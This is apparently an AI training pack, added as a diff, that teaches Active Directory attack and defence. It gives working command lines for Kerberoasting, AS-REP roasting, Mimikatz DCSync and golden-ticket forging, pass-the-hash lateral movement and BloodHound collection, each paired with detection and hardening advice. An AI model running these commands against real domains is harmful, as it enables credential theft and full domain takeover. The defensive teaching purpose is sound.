@@ -1,0 +1,338 @@
+================================================================================
+TITAN AI — TRAINING PACK 033: ACTIVE DIRECTORY ATTACKS AND DEFENSE
+KERBEROS, CREDENTIAL ATTACKS, BLOODHOUND, TIER MODEL, HARDENING
+================================================================================
+
+================================================================================
+PART 1: ACTIVE DIRECTORY FUNDAMENTALS FOR ATTACKERS AND DEFENDERS
+================================================================================
+
+--- AD ARCHITECTURE ---
+
+DOMAIN CONTROLLER (DC): Server hosting Active Directory.
+  LDAP port 389: Query directory for users, groups, computers.
+  Kerberos port 88: Authentication tickets.
+  DNS port 53: AD-integrated DNS (name resolution for AD objects).
+  SMB port 445: SYSVOL, NETLOGON shares (Group Policy, scripts).
+  RPC: Many AD operations use RPC.
+
+FOREST → DOMAIN → OU STRUCTURE:
+  Forest: Security boundary. Multiple forests = separate AD environments.
+  Domain: Administrative boundary. Users, computers, policies.
+  OU (Organizational Unit): Management container. Group Policy applied here.
+  
+  Trust relationships:
+  Parent-child trusts: Automatic, transitive within forest.
+  Forest trusts: Explicit. Enables cross-forest authentication.
+  
+  Security implication: Within a forest, any Domain Admin can compromise all domains.
+  A "separate domain" in the same forest is NOT a security boundary.
+
+SCHEMA: Defines all object types and attributes in AD.
+  Every user: samAccountName, userPrincipalName, memberOf, pwdLastSet, logonCount.
+  Every computer: dNSHostName, operatingSystem, servicePrincipalName.
+  Every group: member, groupType (security vs distribution, scope).
+
+================================================================================
+PART 2: KERBEROS DEEP DIVE
+================================================================================
+
+--- KERBEROS AUTHENTICATION FLOW ---
+
+ACTORS:
+  KDC (Key Distribution Center): Runs on DC. Two services: AS + TGS.
+  AS (Authentication Service): Issues TGTs.
+  TGS (Ticket Granting Service): Issues service tickets.
+  Client: User/computer requesting access.
+  Service: The resource being accessed.
+
+FULL FLOW:
+  Step 1: AS-REQ (Client → KDC)
+  Client sends: Username, timestamp encrypted with user's NTLM hash.
+  KDC verifies: Decrypts timestamp with stored hash. If valid: Client is authenticated.
+  
+  Step 2: AS-REP (KDC → Client)
+  TGT (Ticket Granting Ticket): Encrypted with krbtgt account hash (only KDC can read).
+    Contains: Client identity, timestamp, validity period.
+  Session key: Encrypted with client's NTLM hash. Client decrypts this.
+  
+  Step 3: TGS-REQ (Client → KDC)
+  Client sends: TGT + SPN (Service Principal Name of target service) + session key encrypted request.
+  KDC verifies: Decrypts TGT (only KDC can). If valid: Issues service ticket.
+  
+  Step 4: TGS-REP (KDC → Client)
+  Service ticket: Encrypted with the service account's NTLM hash (only target service can read).
+    Contains: Client identity, PAC (Privilege Attribute Certificate with group memberships).
+  
+  Step 5: AP-REQ (Client → Service)
+  Client presents service ticket to target service.
+  Service decrypts with its own hash → Reads client identity and PAC → Grants access based on groups.
+
+KEY INSIGHT FOR ATTACKERS:
+  The service never contacts the KDC to validate the ticket.
+  Service only: Decrypt with its own hash → trust what's inside.
+  Golden Ticket: Forge TGT signed with krbtgt hash → unlimited access to any service.
+  Silver Ticket: Forge service ticket signed with service account hash → access to that service.
+
+================================================================================
+PART 3: KERBEROS ATTACKS
+================================================================================
+
+--- KERBEROASTING ---
+
+MECHANISM:
+  Any authenticated domain user can request service tickets for any SPN.
+  Service ticket encrypted with SERVICE ACCOUNT'S NTLM hash.
+  Attacker can request ticket, take it offline, crack the hash.
+  No special privileges required. Just a domain user account.
+  
+  Targets: Service accounts with SPNs registered.
+  Most vulnerable: Accounts with weak passwords + SPNs.
+  Common high-value targets: SQL Server service accounts, IIS app pools, custom services.
+
+EXECUTION:
+  # Impacket GetUserSPNs:
+  python GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request
+  # Output: Kerberos hashes for all SPNs
+  
+  # With PowerView:
+  Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
+  
+  # With Rubeus:
+  Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
+  
+  # Crack offline:
+  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
+
+DEFENSE:
+  Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA).
+  gMSA: 240-character random password, auto-rotated by AD. Cannot be cracked.
+  For legacy services that need regular accounts: Ensure password > 25 characters, random.
+  Monitor: Event ID 4769 with ticket encryption type 0x17 (RC4) — weak encryption, Kerberoasting.
+  Preferred encryption: AES256 (0x12). Harder to crack. Monitor RC4 as anomaly.
+
+--- AS-REP ROASTING ---
+
+MECHANISM:
+  If user has "Do not require Kerberos preauthentication" set:
+  Attacker can request AS-REP for that user without knowing their password.
+  AS-REP includes data encrypted with user's hash → crack offline.
+  
+  This flag: Exists for compatibility. Should never be set in modern environments.
+
+EXECUTION:
+  python GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt
+  # users.txt: List of usernames to check
+  # For each account with preauthentication disabled: Returns crackable hash
+  
+  hashcat -m 18200 asrep_hashes.txt rockyou.txt
+
+DEFENSE:
+  Enumerate accounts with this flag: 
+  Get-DomainUser -PreauthNotRequired | Select samAccountName
+  Remove the flag from all accounts. No exceptions.
+
+--- GOLDEN TICKET ---
+
+MECHANISM:
+  Forge TGT using the krbtgt account's NTLM hash.
+  TGT signed with krbtgt hash → KDC trusts it completely.
+  Can set any username, any groups, any ticket validity period (10 years).
+  
+  "If you have krbtgt hash: You own the domain. Forever (until krbtgt is reset twice)."
+
+EXECUTION (requires Domain Admin first to get krbtgt hash):
+  # Dump krbtgt hash with Mimikatz (on DC):
+  mimikatz# lsadump::dcsync /domain:domain.local /user:krbtgt
+  # Output: NTLM hash of krbtgt
+  
+  # Create Golden Ticket:
+  mimikatz# kerberos::golden /user:Administrator /domain:domain.local \
+    /sid:S-1-5-21-... /krbtgt:NTLM_HASH /id:500 /groups:512,518,519,520 \
+    /ticket:golden.kirbi
+  
+  # Inject ticket:
+  mimikatz# kerberos::ptt golden.kirbi
+  
+  # Now: Access any resource as Administrator with no expiry
+  dir \\dc01\c$
+
+DEFENSE:
+  Detect: Tickets with unusual validity periods, user SIDs that don't match accounts.
+  Monitor Event ID 4769: Service tickets requested for KRBTGT with unusual parameters.
+  KDC PAC Validation: Services validate PAC against DC. Somewhat mitigates Golden Tickets.
+  
+  When you suspect Golden Ticket compromise: Reset krbtgt password TWICE.
+  First reset: Invalidates current Golden Tickets.
+  Second reset (after all DCs replicate): Ensures no old hash usable.
+  Between resets: 12-24 hours for replication. Legitimate Kerberos outage.
+
+--- PASS THE HASH (PTH) ---
+
+MECHANISM:
+  NTLM authentication uses hash (not plaintext password) as the credential.
+  If you have someone's NTLM hash: Authenticate as them WITHOUT cracking.
+  
+EXECUTION:
+  # PsExec with hash:
+  impacket-psexec domain/administrator@192.168.1.10 -hashes :NTLM_HASH
+  
+  # SMB access:
+  impacket-smbclient domain/administrator@192.168.1.10 -hashes :NTLM_HASH
+  
+  # WMI execution:
+  impacket-wmiexec domain/administrator@192.168.1.10 -hashes :NTLM_HASH
+  
+  # Lateral movement with Mimikatz:
+  sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe
+
+DEFENSE:
+  Disable NTLM authentication (force Kerberos):
+  GPO: Computer Configuration → Windows Settings → Security Settings → 
+       Local Policies → Security Options → Network security: 
+       Restrict NTLM: Outgoing NTLM traffic to remote servers → Deny all
+  
+  Protected Users security group: Users cannot use NTLM. Forces Kerberos.
+  Eliminates PTH attacks for members. Add: All admin accounts.
+  Note: Some legacy applications break without NTLM. Test before deploying.
+
+================================================================================
+PART 4: BLOODHOUND — ATTACK PATH ANALYSIS
+================================================================================
+
+--- BLOODHOUND METHODOLOGY ---
+
+BloodHound: Graph-based AD attack path analysis tool.
+Ingestors collect data: Users, groups, computers, GPOs, trusts, sessions.
+Graph visualization: Shows attack paths visually.
+Pre-built queries: Find paths from any user to Domain Admin.
+
+DATA COLLECTION:
+  # SharpHound (C# collector — runs on Windows in target domain):
+  SharpHound.exe -c All --zipfilename output.zip
+  
+  # BloodHound.py (Python — runs from attacker machine with credentials):
+  python bloodhound.py -d domain.local -u user -p password -ns 192.168.1.10 -c All
+
+HIGH-VALUE BUILT-IN QUERIES:
+
+"Find Shortest Paths to Domain Admins":
+  Shows all paths from any user → Domain Admin group.
+  Common paths found:
+  - UserA → MemberOf GroupA → CanRDP → ServerB → UserC logged in → AdminPriv → DC
+  - UserA → GenericWrite → GroupB → MemberOf AdminGroup
+  - UserA → Owns → ComputerB → HasSession → UserC → DelegatedAdmin
+
+"Find all Kerberoastable High-Value Targets":
+  Service accounts with weak encryption that are also in privileged groups.
+  Crack the account → inherit its privileges.
+
+"Find AS-REP Roastable Users":
+  Accounts with preauthentication disabled.
+
+"Find Principals with DCSync Rights":
+  DCSync allows replicating all password hashes from a DC.
+  Any account with: Replicating Directory Changes + Replicating Directory Changes All.
+  These are essentially Domain Admin equivalents.
+
+CYPHER QUERIES (custom analysis):
+  // Find all users who can modify sensitive group memberships
+  MATCH p=shortestPath((u:User)-[r:MemberOf|GenericWrite|GenericAll|WriteDacl|WriteOwner*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
+  WHERE NOT u.name = "ADMINISTRATOR@DOMAIN.LOCAL"
+  RETURN p LIMIT 10
+  
+  // Find computers where Domain Admins have sessions (high-value target for credential theft)
+  MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
+  RETURN c.name, u.name
+
+================================================================================
+PART 5: AD TIERING AND HARDENING
+================================================================================
+
+--- THE TIER MODEL (MICROSOFT PAW MODEL) ---
+
+PROBLEM: Admin accounts used on workstations → Workstation compromised → Admin credentials stolen.
+Admin credentials → Domain Controller compromised.
+
+TIER 0: Domain Controllers, AD Connect, ADFS, PKI infrastructure
+  Assets: DCs, Certificate Authorities, Azure AD Connect servers.
+  Admin accounts: Tier 0 admin accounts. Used ONLY on Tier 0 assets.
+  Workstation: Dedicated Privileged Access Workstation (PAW) for Tier 0 admins.
+  
+TIER 1: Member servers (application servers, DB servers, file servers)
+  Admin accounts: Tier 1 admin accounts. Used ONLY on Tier 1 assets.
+  Never used on: Workstations (Tier 2) or DCs (Tier 0).
+  
+TIER 2: Workstations and laptops
+  Admin accounts: Tier 2 accounts (local admin equivalents).
+  Helpdesk: Reset passwords, deploy software. Tier 2 only.
+
+ENFORCEMENT:
+  Authentication policy silos (Windows Server 2012 R2+):
+  Tier 0 accounts: Can ONLY authenticate to Tier 0 computers.
+  If Tier 0 admin tries to RDP into a workstation: Denied. Even if they know the credentials.
+  
+  Local Administrator Password Solution (LAPS):
+  Every workstation: Unique random local admin password.
+  Stored in AD, accessible to authorized admins only.
+  Compromise one workstation: Cannot use same local admin password on others.
+  Deploy via GPO. Free from Microsoft.
+
+CREDENTIAL GUARD:
+  Uses Hyper-V virtualization to protect LSASS.
+  NTLM hashes and Kerberos tickets stored in separate virtual machine (VSM).
+  Mimikatz cannot dump: Credentials not in regular process memory.
+  
+  Enable via GPO:
+  Computer Configuration → Administrative Templates → System → Device Guard →
+  Turn On Virtualization Based Security → Enabled
+  Select Platform Security Level: Secure Boot and DMA Protection
+  Credential Guard Configuration: Enabled with UEFI lock
+
+DCSYNC ATTACK AND DEFENSE:
+  DCSync: Mimics AD replication. Requests password hash from DC without touching LSASS.
+  
+  Command:
+  mimikatz# lsadump::dcsync /domain:domain.local /user:krbtgt
+  mimikatz# lsadump::dcsync /domain:domain.local /all /csv  # All hashes
+  
+  Requirements: Replicating Directory Changes + Replicating Directory Changes All.
+  Default holders: Domain Admins, Enterprise Admins, Domain Controllers.
+  Often misconfigured: Exchange Windows Permissions group (Exchange setup grants these).
+  
+  Detection:
+  Event ID 4662 on DC: Replication rights used by unexpected account.
+  Monitor: Any account NOT in Domain Controllers or Domain Admins group using replication.
+  
+  Lateral movement detection: Event ID 4624 (Logon) with LogonType 3 (network) from admin accounts
+  should be rare. Alert when admin account authenticates to many machines in short window.
+
+--- PRIVILEGED ACCESS WORKSTATIONS (PAW) ---
+
+PAW REQUIREMENTS:
+  Hardware: Dedicated machine. Never used for email, web browsing.
+  OS: Clean Windows installation. Minimal software.
+  Network: Restricted outbound. Can only reach Tier 0 assets.
+  No internet access: Cannot browse web from PAW.
+  No email: No Outlook on PAW.
+  Full disk encryption: BitLocker with TPM.
+  Credential Guard: Enabled.
+  Application whitelisting: Only admin tools allowed.
+  
+  Why: Even the most secure admin account is worthless if the machine it's used from is compromised.
+  Phishing email → Malware on workstation → Steals Tier 0 credentials from memory → DC compromised.
+  PAW: No email, no web → no phishing → no malware → credentials safe.
+  
+  Operational: Admins have TWO machines: Regular workstation (daily work) + PAW (admin tasks only).
+  Never: Use regular workstation for admin tasks. Never use PAW for regular tasks.
+
+================================================================================
+END OF PACK 033: ACTIVE DIRECTORY ATTACKS AND DEFENSE
+Total: AD architecture (DC roles, forest/domain/trust), full Kerberos flow with
+security analysis, Kerberoasting (execution + gMSA defense), AS-REP Roasting,
+Golden Ticket (forge + detection + dual krbtgt reset procedure), Pass the Hash
+(execution + NTLM restriction defense), BloodHound data collection, built-in queries,
+custom Cypher queries, AD Tiering Model (Tier 0/1/2 with enforcement), LAPS, 
+Credential Guard GPO configuration, DCSync attack + detection, Privileged Access
+Workstation requirements and operational model.
+================================================================================
